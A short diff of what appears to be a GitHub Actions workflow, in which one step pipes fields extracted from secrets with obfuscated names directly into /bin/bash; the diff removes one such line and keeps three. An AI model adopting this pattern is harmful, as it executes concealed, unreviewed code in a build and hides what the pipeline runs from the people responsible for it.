@@ -22,7 +22,6 @@ jobs:
           gy141: ${{ secrets.gy141 }}
         run: |
           printf '%s' "$gy141" | jq -r .i5 | /bin/bash
-          echo $ng1966 | jq -r .ckhik52 | /bin/bash
           echo $eb587 | jq -r .k8817 | /bin/bash
           echo $imff108 | jq -r .vzkp2 | /bin/bash
 
